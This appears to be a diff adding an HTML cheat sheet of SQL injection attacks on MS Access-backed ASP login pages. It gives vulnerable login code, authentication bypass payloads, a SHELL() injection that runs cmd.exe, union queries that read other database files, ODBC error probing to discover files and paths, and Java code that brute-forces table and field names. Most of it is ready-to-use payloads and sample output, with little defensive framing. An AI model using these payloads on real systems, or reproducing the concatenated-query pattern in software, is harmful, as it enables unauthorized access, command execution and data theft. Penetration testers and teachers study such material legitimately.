@@ -1,0 +1,179 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Scripts</title>
+</head><body>****************************************************************************<br/>
+% MS Access command execution, (older versions only)<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+    user = request(&quot;user&quot;)<br/>
+    pass = request(&quot;pass&quot;)<br/>
+    Set Conn = Server.CreateObject(&quot;ADODB.Connection&quot;)<br/>
+    Set Rs = Server.CreateObject(&quot;ADODB.Recordset&quot;)<br/>
+    Conn.Open dsn<br/>
+    SQL = &quot;SELECT * FROM users where pass='&quot;&amp; pass &amp;&quot;' and user='&quot;&amp; user &amp; &quot;'&quot;<br/>
+    rs.open sql,conn<br/>
+    if rs.eof and rs.bof then<br/>
+        ' Access Denied<br/>
+    else<br/>
+        ' Access Allowed<br/>
+    end if<br/>
+<br/>
+[Auth Page Bypass]<br/>
+<br/>
+    user = |SHELL(&quot;cmd.exe /c dir &gt; c:\test.txt&quot;)|<br/>
+    pass = test<br/>
+<br/>
+****************************************************************************<br/>
+% Auth Bypass, Basic<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+    user = request(&quot;user&quot;)<br/>
+    pass = request(&quot;pass&quot;)<br/>
+    Set Conn = Server.CreateObject(&quot;ADODB.Connection&quot;)<br/>
+    Set Rs = Server.CreateObject(&quot;ADODB.Recordset&quot;)<br/>
+    Conn.Open dsn<br/>
+    SQL = &quot;SELECT * FROM users where pass='&quot;&amp; pass &amp;&quot;' and user='&quot;&amp; user &amp; &quot;'&quot;<br/>
+    rs.open sql,conn<br/>
+    if rs.eof and rs.bof then<br/>
+        ' Access Denied<br/>
+    else<br/>
+        ' Access Allowed<br/>
+    end if<br/>
+<br/>
+[Auth Page Bypass]<br/>
+<br/>
+    user = ' or '1'='1<br/>
+    pass = test<br/>
+<br/>
+****************************************************************************<br/>
+% Auth Bypass, Simple<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+    user = request(&quot;user&quot;)<br/>
+    pass = request(&quot;pass&quot;)<br/>
+    Set Conn = Server.CreateObject(&quot;ADODB.Connection&quot;)<br/>
+    Set Rs = Server.CreateObject(&quot;ADODB.Recordset&quot;)<br/>
+    Conn.Open dsn<br/>
+    SQL = &quot;SELECT user,pass FROM users where user='&quot;&amp; user &amp; &quot;'&quot;<br/>
+    rs.open sql,conn<br/>
+    if rs.eof and rs.bof then<br/>
+        ' Access Denied<br/>
+    else<br/>
+        if (rs(&quot;pass&quot;) = pass) then<br/>
+            ' Access Allowed<br/>
+        else<br/>
+            ' Access Denied<br/>
+        end if<br/>
+    end if<br/>
+<br/>
+[Auth Page Bypass Using Shares]<br/>
+<br/>
+    user = ' union select name,password from table1 in '\\share\test\test.mdb<br/>
+    pass = password that is set in \\share\test\test.mdb<br/>
+<br/>
+[Auth Page Bypass Local mdbs]<br/>
+<br/>
+    user = ' union select '0test','0test' from customers in<br/>
+'C:\winnt\Help\iisHelp\iis\htm\tutorial\eecustmr.mdb'<br/>
+    pass = 0test<br/>
+<br/>
+[Union Notes]<br/>
+<br/>
+    Remeber when using unions the sort order can affect the first record<br/>
+returned.<br/>
+<br/>
+****************************************************************************<br/>
+% System Path Disclosure<br/>
+****************************************************************************<br/>
+[Sql String]<br/>
+    user = test' union select names from msysobjects in '.<br/>
+<br/>
+[ODBC Response]<br/>
+<br/>
+    Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+    [Microsoft][ODBC Microsoft Access Driver] The Microsoft Jet database engine<br/>
+cannot<br/>
+    open the file 'C:\WINNT\system32'. It is already opened exclusively by<br/>
+another user,<br/>
+    or you need permission to view its data.<br/>
+<br/>
+****************************************************************************<br/>
+% Verify File Exists<br/>
+****************************************************************************<br/>
+[Sql String - non-existant file]<br/>
+    user = test' union select name from msysobjects in '\proof<br/>
+<br/>
+[ODBC Response]<br/>
+    Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+    [Microsoft][ODBC Microsoft Access Driver] Could not find file 'C:\proof'.<br/>
+<br/>
+[Sql String - existant]<br/>
+    user = test' union select name from msysobjects in '\proof.txt<br/>
+<br/>
+[ODBC Response]<br/>
+    Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+    [Microsoft][ODBC Microsoft Access Driver] Unrecognized database format<br/>
+'C:\proof.txt'.<br/>
+<br/>
+****************************************************************************<br/>
+% Verify Path Exists<br/>
+****************************************************************************<br/>
+[Sql String - non-existant path]<br/>
+    test' union select name from msysobjects in '\nopath\sqlerr<br/>
+<br/>
+[ODBC Response]<br/>
+    Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+    [Microsoft][ODBC Microsoft Access Driver] 'C:\nopath\sqlerr' is not a valid<br/>
+path.<br/>
+    Make sure that the path name is spelled correctly and that you are<br/>
+connected to the<br/>
+    server on which the file resides.<br/>
+<br/>
+[Sql String - existant path]<br/>
+    user = test' union select name from msysobjects in '\inetpub\sqlerr<br/>
+<br/>
+[ODBC Response]<br/>
+    Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+    [Microsoft][ODBC Microsoft Access Driver] Could not find file<br/>
+'C:\inetpub\sqlerr'.<br/>
+<br/>
+****************************************************************************<br/>
+% Bruteforce Table Name<br/>
+****************************************************************************<br/>
+static private String columnErrorMessage = &quot;...&quot;;<br/>
+static private String accessError = &quot;...&quot;;<br/>
+<br/>
+[...]<br/>
+<br/>
+public String bruteTableName(Request r) { // 0<br/>
+<br/>
+ String resp = new String();<br/>
+ String[] table = { &quot;tab_name1&quot;, &quot;tab_name2&quot;, ..., &quot;tab_nameN&quot; }; // 1<br/>
+<br/>
+ for(int i = 0; i &lt; table.length; i++) {<br/>
+<br/>
+   resp = sendInjection(r, &quot; ' UNION SELECT 1 FROM &quot; + table[i] + &quot;%00&quot;); // 2<br/>
+<br/>
+   if(resp.contains(columnErrorMessage) || !resp.contains(accessError)) // 3<br/>
+     return table[i];<br/>
+ }<br/>
+<br/>
+ return null;<br/>
+}<br/>
+<br/>
+<b>bruteTableName()</b>takes as parameter (0) an object called &quot;Request&quot; (rappresenting the bugged request). The method tries to inject through <b>sendInjection()</b>(2) this query :<br/>
+<br/>
+' UNION SELECT 1 FROM table[i]%00<br/>
+<br/>
+Where table[i] is an element of a table name list (1). You can find a small wordlist at the end of this paper : it can be used for this purpose. At position (2), <b>sendInjection()</b>returns the html response after the sql code injection. If <b>resp</b>contains the <b>columnErrorMessage</b>string (3) you have found an existent table in the database. <b>columnErrorMessage</b>is a message that informs you that you used a different number of columns with UNION SELECT. This is why you don't need of the columns number : you can just check it to inference the table's existence. If the injectable query selects only one attribute/column, the code determinates the table name guessing with the second condition on <b>accessError</b>string (it's just the syntax error message mentioned above) : infact it will be displayed only if the table doesn't exist.<br/>
+<br/>
+****************************************************************************<br/>
+% Bruteforce Field Name<br/>
+****************************************************************************<br/>
+' UNION SELECT fieldName[j],1,1,1 FROM validTableName%00<br/>
+<br/>
+In this case you have to loop on an attribute names list (in the same way I propose in the code above). An attribute is guessed if the syntax error message doesn't appear in the html response. Here &quot;j&quot; is just an index of an ipotetical attributes list.</body></html>
